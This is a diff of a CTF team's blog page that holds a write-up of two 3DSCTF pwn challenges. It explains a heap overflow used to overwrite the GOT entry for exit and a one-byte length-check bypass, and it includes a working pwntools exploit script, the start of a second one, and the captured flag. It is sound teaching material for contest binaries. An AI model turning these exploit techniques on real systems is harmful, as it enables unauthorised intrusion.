@@ -17,14 +17,14 @@
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2018-01-14T00:00:00-05:00" />
 <script type="application/ld+json">
-{"headline":"3DSCTF - Cupheap, MrRobof","dateModified":"2018-01-14T00:00:00-05:00","datePublished":"2018-01-14T00:00:00-05:00","url":"http://localhost:4000/update/post/3dsctf/writeup/pwn/python/2018/01/14/Writeup-3DSCTF-Cupheap-MrRobof.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/update/post/3dsctf/writeup/pwn/python/2018/01/14/Writeup-3DSCTF-Cupheap-MrRobof.html"},"author":{"@type":"Person","name":"dreamist"},"description":"In between flights I had gotten to doing two of the PWN challenges in 3DSCTF. Here I shall explain as best I can the notes I took during the event.","@type":"BlogPosting","@context":"http://schema.org"}</script>
+{"headline":"3DSCTF - Cupheap, MrRobof","dateModified":"2018-01-14T00:00:00-05:00","datePublished":"2018-01-14T00:00:00-05:00","description":"In between flights I had gotten to doing two of the PWN challenges in 3DSCTF. Here I shall explain as best I can the notes I took during the event.","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/update/post/3dsctf/writeup/pwn/python/2018/01/14/Writeup-3DSCTF-Cupheap-MrRobof.html"},"@type":"BlogPosting","url":"http://localhost:4000/update/post/3dsctf/writeup/pwn/python/2018/01/14/Writeup-3DSCTF-Cupheap-MrRobof.html","author":{"@type":"Person","name":"dreamist"},"@context":"http://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 				<meta name="description" content="The official website for ntropy, UNC Chapel Hill CTF Team"/>
 				<meta name="viewport" content="width=device-width, initial-scale=1">
 				<meta name="theme-color" content="#157878">
 				<link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
-				<link rel="stylesheet" href="/assets/css/style.css?v=ca091a7e7005eb9aa2cd9cc08030b71b663a4227">
+				<link rel="stylesheet" href="/assets/css/style.css?v=685d4e8d1f06ab10c8ee7065aaa3637b335e4f04">
 
 
 				<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css"></link>
@@ -69,7 +69,7 @@ and neither PIC nor stack canaries.</p>
 
 <p>When you run the binary, you get the following opening prompt.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>       Well Cuphead and his pal Mugman
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>       Well Cuphead and his pal Mugman
             They like to roll the dice
                    By chance they came
                         On Heap's game
@@ -95,15 +95,15 @@ Choose one option:
 
 <p>Cool stuff.</p>
 
-<p>Each time you collect memory, you’re randomly incrementing a global variable <code class="highlighter-rouge">contracts</code>
+<p>Each time you collect memory, you’re randomly incrementing a global variable <code class="language-plaintext highlighter-rouge">contracts</code>
 in amounts of 0, 0x400, or 0x800 in rounds of five. You start with 0x100. 
 On a few different specific amounts,
-new options open up. Randomization seeded with <code class="highlighter-rouge">srand(time())</code>.</p>
+new options open up. Randomization seeded with <code class="language-plaintext highlighter-rouge">srand(time())</code>.</p>
 
 <p>Also, when the main function first runs, there’s four calls to malloc, moving the heap
 into something like this, where each cell is 8 bytes in length.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Malloc 1 (0x10)
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Malloc 1 (0x10)
 .--------------------------.
 |___0x1_____|___malloc2_ptr|
                    |          
@@ -124,11 +124,11 @@ Malloc 4 (0x8)     |
 <p>The pointers to the Malloc 1 and Malloc 3 region (both containing pointers to the
 2nd and 4th) are stored on the stack. Under glibc’s malloc implementation, these
 allocations are contiguous, one coming right after the other, which opens up the 
-door for us when we can hit the <code class="highlighter-rouge">mausoleum</code> function. This function can only
+door for us when we can hit the <code class="language-plaintext highlighter-rouge">mausoleum</code> function. This function can only
 be reached after reaching 0x1100 souls, achievable with checks in a loop.
 I mentally decompiled this function from the disassembly into the following C-psuedocode.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void mausoleum(){
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void mausoleum(){
 	extern (void*) malloc1[2];
         extern (void*) malloc3[2];
         char buffer[0x1000];
@@ -146,84 +146,84 @@ when strcpy gets called again, we can essentially get an arbitrary write into an
 process space.</p>
 
 <p>The arbitrary write might have a number of good targets, but the most convenient is the
-<a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">Global Offset Table</a> entry for <code class="highlighter-rouge">exit</code>, since it’s called very soon after. After doing some
+<a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">Global Offset Table</a> entry for <code class="language-plaintext highlighter-rouge">exit</code>, since it’s called very soon after. After doing some
 additional enumeration of abusable functions within the binary, I notice one that was
-compiled in, but never called. <code class="highlighter-rouge">visitHell</code> turned out to read the flag from a file on the local
+compiled in, but never called. <code class="language-plaintext highlighter-rouge">visitHell</code> turned out to read the flag from a file on the local
 file system, removing the need for me to get a shell.</p>
 
 <p>Here’s the essential exploit.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/python
 
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+from pwn import *
 
-<span class="n">binary</span> <span class="o">=</span> <span class="s">"cupheap"</span>
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
-<span class="n">chall</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="s">"cupheap01.3dsctf.org"</span><span class="p">,</span> <span class="mi">8007</span>
+binary = "cupheap"
+elf = ELF(binary)
+chall, port = "cupheap01.3dsctf.org", 8007
 
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"DEBUG"</span>
-<span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">False</span>
+context.log_level = "DEBUG"
+DEBUG = False
 
 
-<span class="k">def</span> <span class="nf">getpipe</span><span class="p">():</span>
-    <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">chall</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+def getpipe():
+    if DEBUG:
+        return process(binary)
+    else:
+        return remote(chall, port)
 
-<span class="s">"""
+"""
 In order to reach the vulnerable code in mauosoleum,
 we have to get exactly 0x1100 in the variable contracts.
 This variable is printed out in hex after every use of the
 first menu option "Collect memory."
 
 This has to be tried repeatedly until we get exactly 0x1100.
-"""</span>
-<span class="n">p</span> <span class="o">=</span> <span class="bp">None</span>
+"""
+p = None
 
-<span class="k">def</span> <span class="nf">getContracts</span><span class="p">(</span><span class="n">proc</span><span class="p">):</span>
-    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-        <span class="n">proc</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Give up</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-        <span class="n">proc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-        <span class="n">proc</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"You have "</span><span class="p">)</span>
-        <span class="n">contracts</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
-        <span class="k">if</span> <span class="n">contracts</span> <span class="o">==</span> <span class="mh">0x1100</span><span class="p">:</span>
-            <span class="k">return</span> <span class="bp">True</span>
-        <span class="k">elif</span> <span class="n">contracts</span> <span class="o">&gt;</span> <span class="mh">0x1100</span><span class="p">:</span>
-            <span class="k">return</span> <span class="bp">False</span>
+def getContracts(proc):
+    while True:
+        proc.recvuntil("Give up\n")
+        proc.send("1\n")
+        proc.recvuntil("You have ")
+        contracts = int(proc.recv(6), 16)
+        if contracts == 0x1100:
+            return True
+        elif contracts &gt; 0x1100:
+            return False
 
-<span class="n">p</span> <span class="o">=</span> <span class="n">getpipe</span><span class="p">()</span>
+p = getpipe()
 
-<span class="k">while</span> <span class="n">getContracts</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">!=</span> <span class="bp">True</span><span class="p">:</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="n">getpipe</span><span class="p">()</span>
+while getContracts(p) != True:
+    p.close()
+    p = getpipe()
 
-<span class="s">"Drop into the second menu form immediately by giving some char not 1-3"</span>
-<span class="k">if</span> <span class="s">"What's next?"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">():</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>
+"Drop into the second menu form immediately by giving some char not 1-3"
+if "What's next?" not in p.recv():
+    p.send("\n\n")
 
-<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+p.recv()
 
-<span class="s">"""
+"""
 At this point, we should be granted access to the Mausoleum.
 
 Now we take advantage of adjacent heap allocations.
-"""</span>
+"""
 
-<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"4</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c">#Enter the Mausoleum</span>
+p.send("4\n") #Enter the Mausoleum
 
-<span class="s">""" Overwrite pointer to malloc4 with exit()'s GOT entry."""</span>
-<span class="n">payload1</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="mh">0xAAAAAAAAAAAAAAAA</span><span class="p">]</span><span class="o">*</span><span class="mi">5</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'exit'</span><span class="p">],</span> <span class="n">word_size</span><span class="o">=</span><span class="mi">64</span><span class="p">)</span>
+""" Overwrite pointer to malloc4 with exit()'s GOT entry."""
+payload1 = flat([0xAAAAAAAAAAAAAAAA]*5, elf.got['exit'], word_size=64)
 
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
-<span class="c">#What's visitHell()?</span>
-<span class="n">visitHell</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">u'_Z9visitHellv'</span><span class="p">]</span>
-<span class="n">payload2</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">visitHell</span><span class="p">,</span> <span class="n">word_size</span><span class="o">=</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+p.sendline(payload1)
+#What's visitHell()?
+visitHell = elf.symbols[u'_Z9visitHellv']
+payload2 = flat(visitHell, word_size=64)
+p.sendline(payload2)
 
-<span class="k">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+print p.recv()
 
-<span class="c">#3DS{y0u_ALL_fr33_0F_th3_H34Ps_d3BT}</span>
+#3DS{y0u_ALL_fr33_0F_th3_H34Ps_d3BT}
 </code></pre></div></div>
 
 <h1 id="mrrobof">MrRobof</h1>
@@ -236,10 +236,10 @@ Now we take advantage of adjacent heap allocations.
 
 <p>The binary reads in arbitrarily-sized data into a size-0x28 (40 bytes) buffer on the stack.
 The trick is that the input is put through two sets of input validation, 
-in <code class="highlighter-rouge">validateSize</code> and <code class="highlighter-rouge">validateIP</code>.</p>
+in <code class="language-plaintext highlighter-rouge">validateSize</code> and <code class="language-plaintext highlighter-rouge">validateIP</code>.</p>
 
-<p><code class="highlighter-rouge">validateIP</code> simply loops through the first 40 characters to only allow an ipv6 address.
-<code class="highlighter-rouge">validateSize</code> takes the size of the input into a single byte, and compares that single BYTE
+<p><code class="language-plaintext highlighter-rouge">validateIP</code> simply loops through the first 40 characters to only allow an ipv6 address.
+<code class="language-plaintext highlighter-rouge">validateSize</code> takes the size of the input into a single byte, and compares that single BYTE
 against 40.</p>
 
 <p>In order to bypass, the first 40 characters need to be a valid ipv6 address, and
@@ -250,7 +250,7 @@ after doing some enumeration, a compiled-yet-unused function was again the easie
 the flag. Some of the code in the following exploit is then probably unnecessary,
 since I didn’t need my own shellcode.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from pwn import *
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from pwn import *
 
 binary = "mrrobof" #Renamed just because
 chall, port = "mrrobof01.3dsctf.org", 8006
